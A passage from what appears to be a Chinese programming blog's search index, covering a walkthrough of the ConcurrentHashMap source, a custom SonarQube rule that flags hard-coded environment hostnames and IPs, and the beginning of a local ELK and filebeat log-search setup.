class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (as == <span class=\"literal\">null</span> || (m = as.length - <span class=\"number\">1</span>) &lt; <span class=\"number\">0</span> ||</span><br><span class=\"line\">            (a = as[ThreadLocalRandom.getProbe() &amp; m]) == <span class=\"literal\">null</span> ||</span><br><span class=\"line\">            !(uncontended =</span><br><span class=\"line\">              U.compareAndSwapLong(a, CELLVALUE, v = a.value, v + x))) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//as为null 或者 as长度小于1 或者修改CounterCell失败，</span></span><br><span class=\"line\">            <span class=\"comment\">//查看LongAdder</span></span><br><span class=\"line\">            fullAddCount(x, uncontended);</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (check &lt;= <span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        <span class=\"comment\">//统计长度</span></span><br><span class=\"line\">        s = sumCount();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//扩容操作</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (check &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        Node&lt;K,V&gt;[] tab, nt; <span class=\"type\">int</span> n, sc;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (s &gt;= (<span class=\"type\">long</span>)(sc = sizeCtl) &amp;&amp; (tab = table) != <span class=\"literal\">null</span> &amp;&amp;</span><br><span class=\"line\">               (n = tab.length) &lt; MAXIMUM_CAPACITY) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">rs</span> <span class=\"operator\">=</span> resizeStamp(n);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (sc &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class=\"number\">1</span> ||</span><br><span class=\"line\">                    sc == rs + MAX_RESIZERS || (nt = nextTable) == <span class=\"literal\">null</span> ||</span><br><span class=\"line\">                    transferIndex &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (U.compareAndSwapInt(<span class=\"built_in\">this</span>, SIZECTL, sc, sc + <span class=\"number\">1</span>))</span><br><span class=\"line\">                    transfer(tab, nt);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (U.compareAndSwapInt(<span class=\"built_in\">this</span>, SIZECTL, sc,</span><br><span class=\"line\">                                         (rs &lt;&lt; RESIZE_STAMP_SHIFT) + <span class=\"number\">2</span>))</span><br><span class=\"line\">                transfer(tab, <span class=\"literal\">null</span>);</span><br><span class=\"line\">            s = sumCount();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>简述put，如果map未初始化，先初始化map。获取key的hash，依据hash与table.size - 1计算相对table的偏移量（(n - 1) &amp; hash)），通过unsafe获取该偏移处的值，如果为null，表示可以直接插入，如果不为空，判断当前是否正在扩容，如果是帮助先帮助扩容，如果不是，把获取的值加锁，判断当前是否链表，之后判断该值hash是否和table一样。如果一样替换，否则在链表末尾添加。如果不是链表依据树添加节点，之后判断如果是链表的话，是否超过最大链表长度8，超过转换为红黑树。最后map长度+1。</p>\n<p>ConcurrentHashMap.get源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> V <span class=\"title function_\">get</span><span class=\"params\">(Object key)</span> &#123;</span><br><span class=\"line\">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; <span class=\"type\">int</span> n, eh; K ek;</span><br><span class=\"line\">    <span class=\"comment\">//获取key hash</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> spread(key.hashCode());</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((tab = table) != <span class=\"literal\">null</span> &amp;&amp; (n = tab.length) &gt; <span class=\"number\">0</span> &amp;&amp;</span><br><span class=\"line\">        <span class=\"comment\">//获取key所在值</span></span><br><span class=\"line\">        (e = tabAt(tab, (n - <span class=\"number\">1</span>) &amp; h)) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//如果获取的值key与传入的一致，直接返回</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((eh = e.hash) == h) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((ek = e.key) == key || (ek != <span class=\"literal\">null</span> &amp;&amp; key.equals(ek)))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> e.val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//如果是树节点</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (eh &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//在树节点中查找节点</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> (p = e.find(h, key)) != <span class=\"literal\">null</span> ? p.val : <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"comment\">//上述链表如果没找到值，遍历后续节点，因为可能会出现计算hash重复情况</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((e = e.next) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (e.hash == h &amp;&amp;</span><br><span class=\"line\">                ((ek = e.key) == key || (ek != <span class=\"literal\">null</span> &amp;&amp; key.equals(ek))))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> e.val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>简述get：先是通用获取key的hash，之后通过计算偏移量找到对应的值，如果获取的值和返回一样直接返回，如果未找到对应的值，判断当前是否树结构，通过在树中找到对应值，如果都未找到，可能是链表中hash相同情况，遍历后续节点比较值。</p>\n<p>ConcurrentHashMap.remove源码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> V <span class=\"title function_\">remove</span><span class=\"params\">(Object key)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> replaceNode(key, <span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">final</span> V <span class=\"title function_\">replaceNode</span><span class=\"params\">(Object key, V value, Object cv)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取key</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">hash</span> <span class=\"operator\">=</span> spread(key.hashCode());</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (Node&lt;K,V&gt;[] tab = table;;) &#123;</span><br><span class=\"line\">        Node&lt;K,V&gt; f; <span class=\"type\">int</span> n, i, fh;</span><br><span class=\"line\">        <span class=\"comment\">//直接获取hash对应的值，如果如果不存在直接返回</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tab == <span class=\"literal\">null</span> || (n = tab.length) == <span class=\"number\">0</span> ||</span><br><span class=\"line\">            (f = tabAt(tab, i = (n - <span class=\"number\">1</span>) &amp; hash)) == <span class=\"literal\">null</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"comment\">//判断当前是否在扩容</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((fh = f.hash) == MOVED)</span><br><span class=\"line\">            <span class=\"comment\">//帮助扩容</span></span><br><span class=\"line\">            tab = helpTransfer(tab, f);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//存在的值</span></span><br><span class=\"line\">            <span class=\"type\">V</span> <span class=\"variable\">oldVal</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"type\">boolean</span> <span class=\"variable\">validated</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"comment\">//锁住通过hash获取到的值</span></span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (f) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//双重校验</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//如果是链表</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (fh &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        validated = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                        <span class=\"comment\">//循环链表修改值</span></span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (Node&lt;K,V&gt; e = f, pred = <span class=\"literal\">null</span>;;) &#123;</span><br><span class=\"line\">                            K ek;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (e.hash == hash &amp;&amp;</span><br><span class=\"line\">                                ((ek = e.key) == key ||</span><br><span class=\"line\">                                 (ek != <span class=\"literal\">null</span> &amp;&amp; key.equals(ek)))) &#123;</span><br><span class=\"line\">                                <span class=\"type\">V</span> <span class=\"variable\">ev</span> <span class=\"operator\">=</span> e.val;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (cv == <span class=\"literal\">null</span> || cv == ev ||</span><br><span class=\"line\">                                    (ev != <span class=\"literal\">null</span> &amp;&amp; cv.equals(ev))) &#123;</span><br><span class=\"line\">                                    oldVal = ev;</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (value != <span class=\"literal\">null</span>)</span><br><span class=\"line\">                                        e.val = value;</span><br><span class=\"line\">                                    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pred != <span class=\"literal\">null</span>)</span><br><span class=\"line\">                                        pred.next = e.next;</span><br><span class=\"line\">                                    <span class=\"keyword\">else</span></span><br><span class=\"line\">                                        setTabAt(tab, i, e.next);</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            pred = e;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> ((e = e.next) == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">//判断是否树结构，树结构删除数据</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (f <span class=\"keyword\">instanceof</span> TreeBin) &#123;</span><br><span class=\"line\">                        validated = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                        TreeBin&lt;K,V&gt; t = (TreeBin&lt;K,V&gt;)f;</span><br><span class=\"line\">                        TreeNode&lt;K,V&gt; r, p;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ((r = t.root) != <span class=\"literal\">null</span> &amp;&amp;</span><br><span class=\"line\">                            (p = r.findTreeNode(hash, key, <span class=\"literal\">null</span>)) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                            <span class=\"type\">V</span> <span class=\"variable\">pv</span> <span class=\"operator\">=</span> p.val;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (cv == <span class=\"literal\">null</span> || cv == pv ||</span><br><span class=\"line\">                                (pv != <span class=\"literal\">null</span> &amp;&amp; cv.equals(pv))) &#123;</span><br><span class=\"line\">                                oldVal = pv;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (value != <span class=\"literal\">null</span>)</span><br><span class=\"line\">                                    p.val = value;</span><br><span class=\"line\">                                <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (t.removeTreeNode(p))</span><br><span class=\"line\">                                    setTabAt(tab, i, untreeify(t.first));</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (validated) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (oldVal != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (value == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                        addCount(-<span class=\"number\">1L</span>, -<span class=\"number\">1</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> oldVal;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ConcurrentHashMap.size源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">size</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">n</span> <span class=\"operator\">=</span> sumCount();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ((n &lt; <span class=\"number\">0L</span>) ? <span class=\"number\">0</span> :</span><br><span class=\"line\">            (n &gt; (<span class=\"type\">long</span>)Integer.MAX_VALUE) ? Integer.MAX_VALUE :</span><br><span class=\"line\">            (<span class=\"type\">int</span>)n);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"title function_\">sumCount</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    CounterCell[] as = counterCells; CounterCell a;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">sum</span> <span class=\"operator\">=</span> baseCount;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (as != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//遍历，所有counter求和</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; as.length; ++i) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((a = as[i]) != <span class=\"literal\">null</span>)</span><br><span class=\"line\">                sum += a.value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在上述put代码中，在代码末尾有addCount操作，里面就有更新当前map长度。因为在使用size的时候，在此期间是可能存在put等其他操作，可能会出现结果不准。addCount中会判断当前是否需要扩容。</p>\n<p>在JDK1.8 之后，如果需要返回size建议使用mappingCount()。</p>\n<p>ConcurrentHashMap主要数据放入了table数组中，通过传入的key进行2次hash计算获取当前key应该存储在该数组所在位置，如果该位置为null，那么通过CAS设置值，如果该位置有值说明出现了hash碰撞，那么判断当前的key和已经存在的key是否一致，如果一致修改值，如果不一致放入链表末尾。当链表长度大于8时，会把该链表转换为红黑树。</p>\n<p>参考：<br><span class=\"exturl\" data-url=\"aHR0cDovL2Ntc2Jsb2dzLmNvbS8/cD0yMjgz\">http://cmsblogs.com/?p=2283<i class=\"fa fa-external-link-alt\"></i></span></p>\n","categories":["多线程学习"],"tags":["并发容器","ConcurrentHashMap"]},{"title":"sonar自定义规则","url":"/2018/01/11/sonar%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%84%E5%88%99/","content":"<p>公司准备使用sonar作为代码质量管理，在代码中string不允许直接定义和环境相关的String，只能从配置文件中读取key，需要自己写一个sonar规则。<br>因为检测的是java文件，直接用java开发个自定义组件。<br>查看各种规则可以使用的语言：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnNvbmFycXViZS5vcmcvZGlzcGxheS9ERVYvQWRkaW5nK0NvZGluZytSdWxlcw==\">Support of Custom Rules by Language<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>编写规则的时候官方有demo：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NvbmFyU291cmNlL3NvbmFyLWN1c3RvbS1ydWxlcy1leGFtcGxlcy90cmVlL21hc3Rlci9qYXZhLWN1c3RvbS1ydWxlcw==\">Sonar Java Custom Rules<i class=\"fa fa-external-link-alt\"></i></span></p>\n<span id=\"more\"></span>\n<h3 id=\"编写自定义规则\"><a href=\"#编写自定义规则\" class=\"headerlink\" title=\"编写自定义规则\"></a>编写自定义规则</h3><p>1、新建maven项目、修改pom.xml为官方demo中pom.xml文件，只保留自己项目相关的信息。<br>2、复制官方demo中文件MyJavaFileCheckRegistrar、MyJavaRulesDefinition、MyJavaRulesPlugin、RulesList四个文件到本地项目中<br>3、修改复制过来的文件修改错误信息、以及项目文件名<br>4、修改RulesList.getJavaChecks中其他demo中规则<br>5、新建自定义规则文件StringValBlacklistCheck.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.sonar.check.Priority;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.sonar.check.Rule;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.sonar.plugins.java.api.JavaFileScanner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.sonar.plugins.java.api.JavaFileScannerContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.sonar.plugins.java.api.tree.BaseTreeVisitor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.sonar.plugins.java.api.tree.LiteralTree;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.ArrayList;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Pattern;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"keyword\">static</span> org.sonar.plugins.java.api.tree.Tree.Kind.STRING_LITERAL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * StringValBlacklistCheck</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by whhxz on 2018/1/10.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"> <span class=\"comment\">//规则描述</span></span><br><span class=\"line\"><span class=\"meta\">@Rule(</span></span><br><span class=\"line\"><span class=\"meta\">        key = &quot;StringValBlacklistCheck&quot;,</span></span><br><span class=\"line\"><span class=\"meta\">        name = &quot;字符串值检查&quot;,</span></span><br><span class=\"line\"><span class=\"meta\">        description = &quot;String不能直接设置与环境相关的值：如：dev1.fn、beta1.fn、idc1.fn、IP 等&quot;,</span></span><br><span class=\"line\"><span class=\"meta\">        priority = Priority.CRITICAL,</span></span><br><span class=\"line\"><span class=\"meta\">        tags = &#123;&quot;disable&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">StringValBlacklistCheck</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseTreeVisitor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">JavaFileScanner</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> List&lt;Pattern&gt; blacklist = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> JavaFileScannerContext context;</span><br><span class=\"line\">    <span class=\"comment\">//正则表达式匹配字符串规则</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//环境相关域名</span></span><br><span class=\"line\">        blacklist.add(Pattern.compile(<span class=\"string\">&quot;.*(dev|beta|idc)[0-9.]*fn.*&quot;</span>));</span><br><span class=\"line\">        <span class=\"comment\">//ip4</span></span><br><span class=\"line\">        blacklist.add(Pattern.compile(<span class=\"string\">&quot;.*\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+.*&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">scanFile</span><span class=\"params\">(JavaFileScannerContext context)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.context = context;</span><br><span class=\"line\"></span><br><span class=\"line\">        scan(context.getTree());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//重写父类方法</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">visitLiteral</span><span class=\"params\">(LiteralTree tree)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//判断是否String</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tree.is(STRING_LITERAL)) &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">strVal</span> <span class=\"operator\">=</span> tree.value();</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Pattern pattern : blacklist) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (pattern.matcher(strVal).matches()) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//不符合规则提示</span></span><br><span class=\"line\">                    context.reportIssue(<span class=\"built_in\">this</span>, tree, String.format(<span class=\"string\">&quot;字符串：%s 不符合规则需要修改，字符串不允许直接出现与环境相关值&quot;</span>, strVal));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.visitLiteral(tree);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>6、在RulesList.getJavaChecks中添加定义的规则StringValBlacklistCheck。修改pom.xml中插件sonar-packaging-maven-plugin中pluginClass为之前MyJavaRulesPlugin修改后的名字<br>7、在resource建立包org.sonar.l10n.java.rules.squid<br>（命名规则参考：MyJavaRulesDefinition.RESOURCE_BASE_PATH定义的路径）<br>8、新建文件StringValBlacklistCheck_java.html（命名规则参考：MyJavaRulesDefinition.addHtmlDescription）</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>字符串值检查<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Noncompliant Code Example<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">pre</span>&gt;</span></span><br><span class=\"line\">    String str = &quot;http://xxxx.dev1.fn/xxxx/xxxx&quot;;// Noncompliant</span><br><span class=\"line\">    String str = &quot;http://xxxx.beta1.fn/xxxx/xxxx&quot;;// Noncompliant</span><br><span class=\"line\">    String str = &quot;http://xxxx.idc1.fn/xxxx/xxxx&quot;;// Noncompliant</span><br><span class=\"line\">    String str = &quot;http://10.11.23.12/xxxx/xxxx&quot;;// Noncompliant</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>Compliant Solution<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">pre</span>&gt;</span></span><br><span class=\"line\">    //从配置文件中读取key，统一管理</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>9、新建文件StringValBlacklistCheck_java.json（命名规则参考：MyJavaRulesDefinition.addMetadata）</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;title&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;String不能直接设置与环境相关的值：如：dev1.fn、beta1.fn、idc1.fn、IP 等&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;VULNERABILITY&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;status&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ready&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;remediation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;func&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Constant\\/Issue&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;constantCost&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;5min&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;tags&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"string\">&quot;disable&quot;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;defaultSeverity&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;CRITICAL&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">#type可以参考RuleType</span><br><span class=\"line\">#status可以参考RuleStatus</span><br></pre></td></tr></table></figure>\n<p>10、打包项目放入 <strong>$SONAR_HOME&#x2F;extensions&#x2F;plugins</strong> 中，重启sonar<br>11、打开sonar web界面，配置插件。<br>11、测试项目，通过maven命令：<em>mvn org.sonarsource.scanner.maven:sonar-maven-plugin:sonar</em> 生成报告，通过最后提示的访问最后打印的url即访问相关信息。（可以通过传递参数sonar.host.url指定sonar地址，默认为本地）</p>\n<p>在测试项目的时候，相关参数可以配置到~&#x2F;.m2&#x2F;setting.xml中：如sonar.host.url等，参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnNvbmFycXViZS5vcmcvZGlzcGxheS9TQ0FOL0FuYWx5emluZyt3aXRoK1NvbmFyUXViZStTY2FubmVyK2ZvcitNYXZlbg==\">Analyzing with SonarQube Scanner for Maven<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnNvbmFycXViZS5vcmcvZGlzcGxheS9QTFVHL1dyaXRpbmcrQ3VzdG9tK0phdmErUnVsZXMrMTAx\">Writing Custom Java Rules<i class=\"fa fa-external-link-alt\"></i></span></p>\n","categories":["sonar"],"tags":["sonar","代码质量"]},{"title":"ELK搭建简单日志查询","url":"/2018/01/11/ELK%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2/","content":"<p>通常在项目日志查看过程中都是直接登录服务器，找到服务器通过一些命令查看日志。有时候在定位问题的时候比较麻烦，不能快速找到问题日志。</p>\n<p>这次尝试在本地搭建简单的ELK查询日志相关信息。</p>\n<p>Elasticsearch：用于日志搜索查询<br>Logstash：用于日志收集<br>Kibana：用于页面展示</p>\n<span id=\"more\"></span>\n<p>1、下载Elasticsearch、因为是简单实用，下载解压后直接使用。<br>2、下载Kibana，修改config下kibana.yml，添加 <strong>elasticsearch.url: “<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMTo5MjAwLw==\">http://127.0.0.1:9200<i class=\"fa fa-external-link-alt\"></i></span>“</strong><br>3、下载Logstash，配置相关配置信息。<br>4、下载filebeat用于采集日志传送到Logstash、配置采集信息</p>\n<p>filebeat配置：<br>备份原有filebeta.yml文件，新增filebeta.yml文件</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">filebeat:</span></span><br><span class=\"line\">  <span class=\"attr\">prospectors:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span></span><br><span class=\"line\">      <span class=\"attr\">paths:</span></span><br><span class=\"line\">        <span class=\"comment\">#采集路径</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"string\">/home/webdata/tomcat/logs/catalina.out</span></span><br><span class=\"line\">      <span class=\"attr\">input_type:</span> <span class=\"string\">log</span></span><br><span class=\"line\">      <span class=\"comment\">#用于日志合并、比如有的日志是异常多行信息，通过下面判断日志是否以时间格式开头，合并到上一行</span></span><br><span class=\"line\">      <span class=\"attr\">multiline.pattern:</span> <span class=\"string\">&#x27;^[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125;&#x27;</span></span><br><span class=\"line\">      <span 